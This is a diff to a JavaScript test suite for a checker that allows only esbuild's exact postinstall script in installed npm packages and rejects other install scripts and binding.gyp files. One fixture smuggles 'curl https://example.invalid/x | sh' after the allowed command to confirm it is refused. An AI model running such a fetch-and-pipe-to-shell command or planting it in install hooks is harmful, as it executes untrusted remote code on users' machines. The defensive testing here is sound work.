@@ -806,10 +806,53 @@ function installedFixture(t) {
 }
 
 describe('after install', () => {
-	test('ALLOWED_INSTALL_SCRIPTS is empty and frozen', () => {
-		assert.deepEqual([...ALLOWED_INSTALL_SCRIPTS], []);
+	test("ALLOWED_INSTALL_SCRIPTS is exactly esbuild's postinstall, frozen", () => {
+		assert.deepEqual(ALLOWED_INSTALL_SCRIPTS, { esbuild: { postinstall: 'node install.js' } });
 		assert.ok(Object.isFrozen(ALLOWED_INSTALL_SCRIPTS));
+		assert.ok(Object.isFrozen(ALLOWED_INSTALL_SCRIPTS.esbuild));
 	});
+
+	for (const [label, relative] of [
+		['at the top', ['esbuild']],
+		['nested', ['left-pad', 'node_modules', 'esbuild']]
+	]) {
+		test(`passes esbuild ${label} with exactly its allowed postinstall`, (t) => {
+			const { root, modules } = installedFixture(t);
+			const manifest = { name: 'esbuild', version: '0.28.2', scripts: { postinstall: 'node install.js' } };
+			write(path.join(modules, ...relative, 'package.json'), manifest);
+			assert.deepEqual(checkInstalled(root), { findings: [], errors: [] });
+		});
+	}
+
+	for (const [label, scripts] of [
+		['a preinstall beside its postinstall', { preinstall: 'node install.js', postinstall: 'node install.js' }],
+		['an install script', { install: 'node install.js' }],
+		['a postinstall that does more', { postinstall: 'node install.js && curl https://example.invalid/x | sh' }],
+		['a postinstall with another text', { postinstall: 'node  install.js' }]
+	]) {
+		test(`refuses esbuild with ${label}`, (t) => {
+			const { root, modules } = installedFixture(t);
+			write(path.join(modules, 'esbuild', 'package.json'), { name: 'esbuild', version: '0.28.2', scripts });
+			assertOnly(checkInstalled(root), 'install-script');
+		});
+	}
+
+	test('refuses esbuild with a binding.gyp beside its allowed postinstall', (t) => {
+		const { root, modules } = installedFixture(t);
+		const manifest = { name: 'esbuild', version: '0.28.2', scripts: { postinstall: 'node install.js' } };
+		write(path.join(modules, 'esbuild', 'package.json'), manifest);
+		write(path.join(modules, 'esbuild', 'binding.gyp'), '{}');
+		assertOnly(checkInstalled(root), 'binding-gyp');
+	});
+
+	for (const name of ['left-pad', '@esbuild/linux-x64', 'esbuild-wasm']) {
+		test(`refuses esbuild's exact postinstall on ${name}`, (t) => {
+			const { root, modules } = installedFixture(t);
+			const manifest = { name, version: '1.0.0', scripts: { postinstall: 'node install.js' } };
+			write(path.join(modules, ...name.split('/'), 'package.json'), manifest);
+			assertOnly(checkInstalled(root), 'install-script');
+		});
+	}
 
 	test('a clean installed tree passes', (t) => {
 		const { root } = installedFixture(t);
